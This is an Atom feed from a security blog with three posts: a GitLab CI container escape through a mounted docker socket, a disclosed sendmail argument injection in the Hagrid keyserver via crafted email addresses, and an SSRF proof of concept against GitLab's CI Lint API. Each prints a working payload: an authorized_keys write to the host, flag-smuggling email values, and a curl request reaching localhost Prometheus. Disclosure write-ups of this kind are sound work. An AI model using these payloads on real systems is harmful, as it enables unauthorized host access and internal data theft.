<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://vin01.github.io/piptagole/feed.xml" rel="self" type="application/atom+xml" /><link href="https://vin01.github.io/piptagole/" rel="alternate" type="text/html" /><updated>2023-03-18T20:36:55+00:00</updated><id>https://vin01.github.io/piptagole/feed.xml</id><title type="html">Vin01’s Blog</title><subtitle>A collection of tidbits which might do some good out there or at least be interesting for some of you.</subtitle><entry><title type="html">Self-hosted github actions using docker machine and gitlab runners</title><link href="https://vin01.github.io/piptagole/docker/security/autoscaling/gitlab/2023/03/13/openstack-docker-machine-host-access.html" rel="alternate" type="text/html" title="Self-hosted github actions using docker machine and gitlab runners" /><published>2023-03-13T23:25:23+00:00</published><updated>2023-03-13T23:25:23+00:00</updated><id>https://vin01.github.io/piptagole/docker/security/autoscaling/gitlab/2023/03/13/openstack-docker-machine-host-access</id><content type="html" xml:base="https://vin01.github.io/piptagole/docker/security/autoscaling/gitlab/2023/03/13/openstack-docker-machine-host-access.html"><![CDATA[<h2 id="what-is-docker-machine">What is docker machine?</h2>

<p><a href="https://github.com/docker/machine/tree/master/drivers">Docker machine</a> was a cool project started in 2014 by Docker which allowed managing remote virtual machines on different providers like AWS, Rackspace and also using drivers like openstack to support managing virtual machines on self-hosted deployments. The primary feature was to automatically install docker on remote hosts and configure docker client to connect to them using docker api (it automagically managed tls certificates, authentication etc.).</p>

<blockquote>
  <p>It creates servers, installs Docker on them, then configures the Docker client to talk to them. (from project’s readme)</p>
</blockquote>

<h2 id="gitlab-supports-autoscaling-for-cicd-and-self-hosted-runners">Gitlab supports autoscaling for ci/cd and self-hosted runners</h2>

<p>Docker <a href="https://github.com/docker/roadmap/issues/245">discontinued</a> maintaining it but Gitlab <a href="https://gitlab.com/gitlab-org/ci-cd/docker-machine">maintains a fork</a> which is currently the <a href="https://docs.gitlab.com/runner/configuration/autoscale.html">preferred mechanism</a> to provide autoscaling solution for self-hosted runners.</p>

<p>Gitlab does intend to replace docker-machine eventually but it has not happened so far.</p>

<p>A couple of open issues with more details:</p>

<ul>
  <li><a href="https://gitlab.com/groups/gitlab-org/-/epics/2502">Autoscaling Provider for GitLab Runner to replace Docker Machine</a></li>
  <li><a href="https://gitlab.com/groups/gitlab-org/-/epics/6995">Docker Machine Replacement Project Plan</a></li>
</ul>

<h2 id="executing-code-on-the-virtual-machines-instead-of-docker-containers">Executing code on the virtual machines instead of docker containers</h2>

<p>This approach alloww using <a href="https://docs.gitlab.com/runner/configuration/runner_autoscale_aws/"><code class="language-plaintext highlighter-rouge">docker</code> executor</a> on a cluster of auto-scaling vms which is not very helpful if you intend to test infrastructure which might include things like:</p>

<ul>
  <li>systemd</li>
  <li>iptables</li>
  <li>system level tracing</li>
</ul>

<p>It is possible to <a href="https://docs.gitlab.com/ee/ci/docker/using_docker_build.html#use-docker-socket-binding">mount docker socket</a> from the host to containers running the ci/cd jobs, although better alternatives like <a href="https://docs.gitlab.com/ee/ci/docker/using_kaniko.html">kaniko</a> might be better in general but that is not going to useful for our use case so we are going to need a mounted docker socket for docker executor ;)</p>

<p>sample runner config to allow mounting docker socket:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  [runners.docker]
    tls_verify = false
    image = "docker:20.10.16"
    privileged = false
    disable_cache = false
    volumes = ["/var/run/docker.sock:/var/run/docker.sock", "/cache"]
</code></pre></div></div>

<h2 id="docker-socket-access-in-container--root-on-the-host">Docker socket access in container == root on the host</h2>

<p>Docker mostly runs as root on the host and granting a user access to docker group (which allows accessing docker socket) is equivalent to granting that user root access unless <a href="https://docs.docker.com/engine/security/userns-remap/">user namespacing</a> is in use or docker is running in <a href="https://docs.docker.com/engine/security/rootless/">rootless mode</a>.</p>

<p>We can utilize this fact to escape out of the docker containers running on an autoscaling cluster and instead execute scripts on the hosts themselves.</p>

<p>example ci config for gitlab:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stages:
  - test

test:
  stage: test
  image: alpine:latest
  script:
    - apk add docker
    - apk add openssh
    - ssh-keygen -t ed25519 -N '' -f ed25519
    - docker run --rm -v /:/host alpine sh -c "echo \"$(cat ed25519.pub)\" &gt;&gt; /host/home/ubuntu/.ssh/authorized_keys"
    - host_ip=$(docker run --rm --net host alpine sh -c "ip route get 1| awk  '{print \$NF}'") &amp;&amp; echo $host_ip
    - |
      ssh -t -o StrictHostKeyChecking=no -i ./ed25519 ubuntu@$host_ip &lt;&lt;'END_TESTS'
      echo "running tests .."
      END_TESTS
</code></pre></div></div>

<p>This approach also makes sure that exit codes are passed on from the commands executed over ssh to container running the job.</p>]]></content><author><name></name></author><category term="docker" /><category term="security" /><category term="autoscaling" /><category term="gitlab" /><summary type="html"><![CDATA[What is docker machine?]]></summary></entry><entry><title type="html">Argument injection in Hagrid keyserver</title><link href="https://vin01.github.io/piptagole/pgp/security/hagrid/2021/06/15/hagrid-argument-injection.html" rel="alternate" type="text/html" title="Argument injection in Hagrid keyserver" /><published>2021-06-15T23:25:23+00:00</published><updated>2021-06-15T23:25:23+00:00</updated><id>https://vin01.github.io/piptagole/pgp/security/hagrid/2021/06/15/hagrid-argument-injection</id><content type="html" xml:base="https://vin01.github.io/piptagole/pgp/security/hagrid/2021/06/15/hagrid-argument-injection.html"><![CDATA[<h3 id="what-is-hagrid-">What is Hagrid ?</h3>

<p>Hagrid as in, “keeper of keys” is a verifying OpenPGP keyserver, written in Rust, powered by <a href="https://sequoia-pgp.org/">Sequoia-PGP</a> running on .</p>

<p>It was <a href="https://keys.openpgp.org/about/news#2019-06-12-launch">launched</a> on 12 June 2019.</p>

<p>It is supposed to replace <a href="https://unix.stackexchange.com/questions/656205/sks-keyservers-gone-what-to-use-instead">SKS key server</a>.</p>

<h3 id="digging-deeper">Digging deeper</h3>

<p>I wanted to take a closer look to find potential security flaws. A key feature potentially with lot of room for vulnerabilities was emali verification. Hagrid supports verifying user IDs with email verification by following a link sent to user’s email address.</p>

<p>Hagrid uses <code class="language-plaintext highlighter-rouge">sendmail</code> for mailing.</p>

<p>I also tested <a href="https://marlam.de/msmtp/">msmtp</a> which can be used as <code class="language-plaintext highlighter-rouge">sendmail</code> replacement for Hagrid integration.</p>

<h3 id="vulnerability">Vulnerability</h3>

<p>Hagrid uses <a href="https://github.com/lettre/lettre">lettre</a> mailing library.</p>

<p>By crafting email addresses like following, it was possible to make <code class="language-plaintext highlighter-rouge">lettre</code> inject arbitrary flags into final <code class="language-plaintext highlighter-rouge">sendmail</code> command.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-bi@example.com    (-bi: Initialize the alias database.)
-d0.1a@example.com (The option -d0.1 prints the version of sendmail and the options it was compiled with.)
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">strace</code> dump from the server running injected sendmail flags:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>28329 execve("/usr/sbin/sendmail", ["/usr/sbin/sendmail", "-i", "-f", "noreply@localhost", "-bi@example.com"], 0x7ffcc8ada608 /* 23 vars */ 
28329 sendto(3, "Nov  4 16:48:22 sendmail[28329]: user 1000 attempted to rebuild the alias map", 81, MSG_NOSIGNAL, NULL, 0) = 81

</code></pre></div></div>

<p>A simple fix was to use <code class="language-plaintext highlighter-rouge">sendmail</code>’s <code class="language-plaintext highlighter-rouge">--</code> flag to treat argument <em>only</em> as an email address.</p>

<p>From <code class="language-plaintext highlighter-rouge">man</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--  Stop processing command flags and use the rest of the arguments as addresses. 
</code></pre></div></div>

<h3 id="disclosure-impact-and-remediation">Disclosure, impact and remediation</h3>

<p>I disaclosed it to both Hagrid and Lettre maintainrs who weree very fast in thwir response. (5 Nov. 2020)</p>

<p>Vincent applied the hotfix to Hagrid <a href="https://gitlab.com/hagrid-keyserver/hagrid/-/commit/612b58dd595f42c15e6d406cf7e8e030c8461f01">on the same day</a></p>

<p><a href="https://github.com/lettre/lettre/security/advisories/GHSA-vc2p-r46x-m3vx">Advisory</a> from lettre within a week.</p>

<p>It was assigned <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28247">CVE-2020-28247</a>.</p>]]></content><author><name></name></author><category term="pgp" /><category term="security" /><category term="hagrid" /><summary type="html"><![CDATA[What is Hagrid ?]]></summary></entry><entry><title type="html">Unauthenticated Gitlab SSRF</title><link href="https://vin01.github.io/piptagole/gitlab/ssrf/security/bugbounty/2021/06/15/gitlab-ssrf.html" rel="alternate" type="text/html" title="Unauthenticated Gitlab SSRF" /><published>2021-06-15T20:25:23+00:00</published><updated>2021-06-15T20:25:23+00:00</updated><id>https://vin01.github.io/piptagole/gitlab/ssrf/security/bugbounty/2021/06/15/gitlab-ssrf</id><content type="html" xml:base="https://vin01.github.io/piptagole/gitlab/ssrf/security/bugbounty/2021/06/15/gitlab-ssrf.html"><![CDATA[<h3 id="meet-gitlab-ci-lint-api">Meet Gitlab <a href="https://docs.gitlab.com/ee/api/lint.html">CI Lint API</a></h3>

<p>Purpose of the CI Lint API is to validate CI/CD YAML configuration for Gitlab.</p>

<p>A usual request to this API would validate YAML payload and provide the result accordingly.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">--header</span> <span class="s2">"Content-Type: application/json"</span>  <span class="s2">"https://gitlab.example.com/api/v4/ci/lint"</span> <span class="nt">--data</span> <span class="s1">'{"content": "{ \"image\": \"ruby:2.6\", \"services\": [\"postgres\"], \"before_script\": [\"bundle install\", \"bundle exec rake db:create\"], \"variables\": {\"DB_NAME\": \"postgres\"}, \"types\": [\"test\", \"deploy\", \"notify\"], \"rspec\": { \"script\": \"rake spec\", \"tags\": [\"ruby\", \"postgres\"], \"only\": [\"branches\"]}}"}'</span>

<span class="o">{</span>
  <span class="s2">"status"</span>: <span class="s2">"valid"</span>,
  <span class="s2">"errors"</span>: <span class="o">[]</span>,
  <span class="s2">"warnings"</span>: <span class="o">[]</span>
<span class="o">}</span>
</code></pre></div></div>

<p><em>Note: prior to this patch, this endpoint did not require any authentication</em></p>

<h3 id="meet-remote-yaml-includes-in-gitlab-ci-configuration-files">Meet <a href="https://docs.gitlab.com/ee/ci/yaml/includes.html#single-string-or-array-of-multiple-values">Remote YAML includes</a> in Gitlab Ci configuration files</h3>

<p>CI configuration files for Gitlab are YAML and can use <code class="language-plaintext highlighter-rouge">include</code> tag to include YAML templates from remote URLs.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>include:
  - <span class="s1">'https://gitlab.com/awesome-project/raw/main/.before-script-template.yml'</span>
</code></pre></div></div>

<h3 id="ssrf">SSRF!</h3>

<p>If you haven’t already figured, <code class="language-plaintext highlighter-rouge">include</code> can also point to <code class="language-plaintext highlighter-rouge">192.168.1.1</code>, <code class="language-plaintext highlighter-rouge">127.0.0.1</code> ..</p>

<p>SSRF proof-of-concept to dump Prometheus targets from the Prometheus API by abusing this vulnerability.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> <span class="nt">--show-error</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> https://gitlab.example.com/api/v4/ci/lint <span class="nt">--data</span> <span class="s1">'{ "include_merged_yaml": true, "content": "include:\n  remote: http://127.0.0.1:9090/api/v1/targets?test.yml" }'</span>

<span class="o">{</span><span class="s2">"status"</span>:<span class="s2">"invalid"</span>,<span class="s2">"errors"</span>:[<span class="s2">"jobs status config should implement a script: or a trigger: keyword"</span>,<span class="s2">"jobs data config should implement a script: or a trigger: keyword"</span>,<span class="s2">"jobs config should contain at least one visible job"</span><span class="o">]</span>,<span class="s2">"warnings"</span>:[],<span class="s2">"merged_yaml"</span>:<span class="s2">"---</span><span class="se">\n</span><span class="s2">status: success</span><span class="se">\n</span><span class="s2">data:</span><span class="se">\n</span><span class="s2">  activeTargets:</span><span class="se">\n</span><span class="s2">  - discoveredLabels:</span><span class="se">\n</span><span class="s2">      __address__: ...
</span></code></pre></div></div>

<p><em>Note: <code class="language-plaintext highlighter-rouge">test.yml</code> is essential part of the paylaod becauyse API expects <code class="language-plaintext highlighter-rouge">.yml</code> extension for validation of remote YAML file</em></p>

<p>This is only exploitable if <a href="https://docs.gitlab.com/ee/security/webhooks.html">internal network requests are enabled</a> in Gitlab (they are disabled by default). It turns out to be a quite widely enabled option though, as internal requests are useful for webhooks, CI operations.</p>

<h3 id="disclosure-impact-and-remediation">Disclosure, impact and remediation</h3>

<p>I disclosed it in December 2020 and first patch was out in <a href="https://about.gitlab.com/releases/2021/02/11/security-release-gitlab-13-8-4-released/">February 2021</a>, second complete patch followed in <a href="https://about.gitlab.com/releases/2021/06/01/security-release-gitlab-13-12-2-released/">June</a> recently. Gitlab team was very supportive and responsive as always ❤️ Thank you for the bounties and swag <a href="https://twitter.com/gitlab">Team Gitlab</a>.</p>

<p>Wide use of the unauthenticated CI Lint API also led to a lot of workflows being <a href="https://gitlab.com/gitlab-org/gitlab/-/issues/321290">disrupted</a>.</p>

<p>I have also disclosed it directly to <strong>many</strong> affected organizations (universities, open source projects, governments) but vulnerable public facing instances are still out there. I did not initially intend to blog it, but looking at the number of affected instances, I think it might help spread the word.</p>

<p><strong>Update</strong>: Patches before December 2021 (version 14.5.2) did not prevent attacks from <a href="https://docs.gitlab.com/ee/user/permissions.html#external-users">external Gitlab users</a>.</p>

<p><strong>Please apply latest gitlab security updates ASAP!</strong></p>]]></content><author><name></name></author><category term="gitlab" /><category term="ssrf" /><category term="security" /><category term="bugbounty" /><summary type="html"><![CDATA[Meet Gitlab CI Lint API]]></summary></entry></feed>